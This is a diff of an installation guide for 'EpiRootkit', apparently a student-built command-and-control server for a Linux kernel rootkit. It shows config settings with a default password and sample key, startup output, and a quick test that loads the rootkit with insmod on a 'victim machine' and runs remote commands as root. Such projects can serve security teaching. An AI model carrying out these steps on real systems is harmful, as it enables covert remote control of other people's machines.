@@ -11,103 +11,127 @@ weight: 302
 
 # Installation Guide
 
-Complete setup instructions for the EpiRootkit C2 server.
+Setup instructions for the EpiRootkit C2 server.
 
 ## Prerequisites
 
-### Verify Prerequisites
+### Required Software
+- **Node.js**: Version 18+ 
+- **pnpm**: Package manager (recommended)
+
+### Verify Installation
 ```bash
-# Check Node.js version
 node --version
+# v18.17.0
 
-# Check pnpm installation
 pnpm --version
+# 8.6.2
 
-# Install pnpm if not available
+# Install pnpm if missing
 npm install -g pnpm
 ```
 
-## Installation Steps
+## Installation
 
-### 1. Navigate to Project Directory
+### 1. Install Dependencies
 ```bash
 cd attacking_program
-```
-
-### 2. Install Dependencies
-```bash
-# Using pnpm (recommended)
 pnpm install
-
-# Or using npm
-npm install
+# ✓ Dependencies installed successfully
 ```
 
-## Configuration
-
-### 1. Review Configuration File
+### 2. Review Configuration
 ```bash
 cat config.env
 ```
 
-**Default Configuration:**
+**Default Settings:**
 ```bash
-# EpiRootkit C2 Server Configuration
-C2_PORT=4444
-WEB_PORT=3000
+# Server ports
+C2_PORT=4444                    # C2 server port
+WEB_PORT=3000                   # Web interface port
 
-# Authentication Configuration
+# Authentication (SHA-512 of "password")
 PASSWORD_HASH=b109f3bbbc244eb82441917ed06d618b9008dd09b3befd1b5e07394c706a8bb980b1d7785e5976ec049b46df5f1326af5a2ea6d103fd07c95385ffab0cacbc86
 
-# Encryption Configuration
-ENCRYPTION_KEY=0123456789abcdef0123456789abcdef
+# Encryption
+ENCRYPTION_KEY=0123456789abcdef0123456789abcdef  # 32-char hex key
 ENABLE_ENCRYPTION=true
 ```
 
-## First Run
-
-### 1. Start the C2 Server
+### 3. Start Server
 ```bash
 pnpm start
+# ✓ Server started on port 4444
+# ✓ Web interface started on port 3000
+# c2-server$ 
 ```
 
-**Expected Output:**
-```
-┌─ C2 Server Interface • Initializing...
-└─ Initializing...
+## Verification
 
-┌─ Setup
-  • [2025-05-25 16:00:00] Config: C2_PORT=4444, WEB_PORT=3000
-└─
-
-┌─ Server Status
-  • [2025-05-25 16:00:00] Server started on port 4444
-└─
-
-  • Web interface started on port 3000
-
-c2-server$ 
-```
-
-### 2. Access Web Interface
-Open your browser and navigate to:
-```
-http://localhost:3000
-```
-
-### 3. Test CLI Interface
+### CLI Interface
 ```bash
-# In the C2 server prompt
-c2-server$ help
+# Test CLI commands
+help
+# EpiRootkit C2 Commands
+# clients                    - List connected clients
+# auth <client> <password>   - Authenticate with client
+# ...
 
-# List clients (should be empty initially)
-c2-server$ ls
-# No clients connected
+ls
+# No clients connected (initially)
 ```
 
-## Next Steps
+### Web Interface
+Access at: `http://localhost:3000`
+- Login with password: `password`
+- Dashboard shows connected clients
+- All CLI features available via web
 
-1. **Connect a Rootkit**: Load the EpiRootkit module on a victim machine
-2. **Authenticate**: Use `auth Client-1 password` to establish secure connection
-3. **Execute Commands**: Start with `exec Client-1 whoami` to test functionality
-4. **Explore Features**: Try file operations, persistence management, and configuration
+## Configuration Options
+
+### Change Ports
+```bash
+# Edit config.env
+C2_PORT=8080        # Custom C2 port
+WEB_PORT=8000       # Custom web port
+```
+
+### Change Password
+```bash
+# Generate new SHA-512 hash
+echo -n "newpassword" | sha512sum
+# Copy the hash to config.env as PASSWORD_HASH
+```
+
+### Disable Encryption
+```bash
+# Edit config.env
+ENABLE_ENCRYPTION=false
+```
+
+## Quick Test
+
+### 1. Connect Rootkit (victim machine)
+```bash
+sudo insmod epirootkit.ko
+# C2 shows: ✓ Client-1 Connected
+```
+
+### 2. Authenticate
+```bash
+auth Client-1 password
+# ✓ Authenticated
+# SUCCESS: Authentication successful
+```
+
+### 3. Test Commands
+```bash
+exec Client-1 whoami
+# Exit code: 0
+# Output: root
+
+status Client-1
+# EpiRootkit Status: Version 1.0.0, Authentication: YES
+```
+
